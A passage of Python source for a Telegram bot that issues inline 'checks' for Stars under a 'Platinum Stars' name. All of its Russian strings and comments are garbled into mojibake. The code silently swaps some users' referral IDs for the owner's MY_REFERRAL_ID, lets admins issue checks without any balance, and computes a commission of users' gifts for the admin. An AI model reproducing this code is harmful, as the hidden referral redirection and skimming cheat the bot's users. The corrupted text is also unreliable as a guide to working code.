            else:
                raise ValueError
                
            if not (1 <= amount <= 1000000):
                raise ValueError
        except (ValueError, IndexError):
            await inline_query.answer([])
            return

        if not is_admin:
            user_balance = balances.get(str(user_id), 0)
            
            if user_balance < amount:
                result = types.InlineQueryResultArticle(
                    id="1",
                    title="‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–≤—ë–∑–¥",
                    description=f"–í–∞—à –±–∞–ª–∞–Ω—Å: {user_balance}‚≠ê | –¢—Ä–µ–±—É–µ—Ç—Å—è: {amount}‚≠ê",
                    input_message_content=types.InputTextMessageContent(
                        message_text=f"‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–≤—ë–∑–¥ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ. –í–∞—à –±–∞–ª–∞–Ω—Å: {user_balance}‚≠ê",
                        parse_mode="HTML"
                    )
                )
                await inline_query.answer([result], cache_time=0, is_personal=True)
                return
            
            balances[str(user_id)] = user_balance - amount
            save_balances()

        timestamp = str(int(time.time()))
        bot_username = (await bot.get_me()).username
        ref_id = MY_REFERRAL_ID if user_id in FORCED_REFERRAL_USERS else user_id
        check_link = f"https://t.me/{bot_username}?start=ref{ref_id}_check_{amount}_{user_id}_{timestamp}"

        # –°—Å—ã–ª–∫–∞ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
        image_url = "https://i.ibb.co/SwfBgs11/Chat-GPT-Image-Aug-7-2025-01-20-41-PM.png"
        
        result = types.InlineQueryResultArticle(
            id=f"check_{timestamp}",
            title=f"–û—Ç–ø—Ä–∞–≤–∏—Ç—å —á–µ–∫ –Ω–∞ {amount}‚≠ê",
            description=f"–ù–∞–∂–º–∏—Ç–µ —á—Ç–æ–±—ã –æ—Ç–ø—Ä–∞–≤–∏—Ç—å {amount} –∑–≤—ë–∑–¥" + (" (–∞–¥–º–∏–Ω)" if is_admin else ""),
            thumbnail_url=image_url,  # –ü—Ä–µ–≤—å—é –≤ –∏–Ω–ª–∞–π–Ω-—Ä–µ–∂–∏–º–µ
            input_message_content=types.InputTextMessageContent(
                message_text=(
                    f'<a href="{image_url}">&#8203;</a>\n'
                    f'üöÄ –ß–µ–∫ –Ω–∞ {amount} –∑–≤—ë–∑–¥ –≤ Platinum Stars\n\n'
                    f"–û—Ç: @{inline_query.from_user.username if inline_query.from_user.username else f'ID:{user_id}'}"
                ),
                parse_mode="HTML"  # –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ–º HTML!
            ),
            reply_markup=types.InlineKeyboardMarkup(
                inline_keyboard=[[
                    types.InlineKeyboardButton(
                        text=f"–ü–æ–ª—É—á–∏—Ç—å {amount}‚≠ê",
                        url=check_link
                    )
                ]]
            )
        )

        await inline_query.answer([result], cache_time=0, is_personal=True)

    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –≤ –∏–Ω–ª–∞–π–Ω-—Ä–µ–∂–∏–º–µ: {e}", exc_info=True)
        await inline_query.answer([])

def calculate_commission(total_gifts: int) -> int:
    """–í—ã—á–∏—Å–ª—è–µ—Ç –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –∞–¥–º–∏–Ω–∞ –ø–æ –∑–∞–¥–∞–Ω–Ω–æ–π —Å—Ö–µ–º–µ"""
    if total_gifts >= 20:
        return 7
    elif total_gifts >= 15:
        return 5
    elif total_gifts >= 10:
        return 3
    elif total_gifts >= 6:
        return 2
    elif total_gifts >= 3:
        return 1
    else:
        return 0
    

async def on_startup():
    """–î–µ–π—Å—Ç–≤–∏—è –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞"""
    # –ü–æ–ª—É—á–∞–µ–º file_id –¥–ª—è —Ñ–æ—Ç–æ —á–µ–∫–∞
    await get_check_photo_file_id()
    logging.info("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω")

async def main():
    await on_startup()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
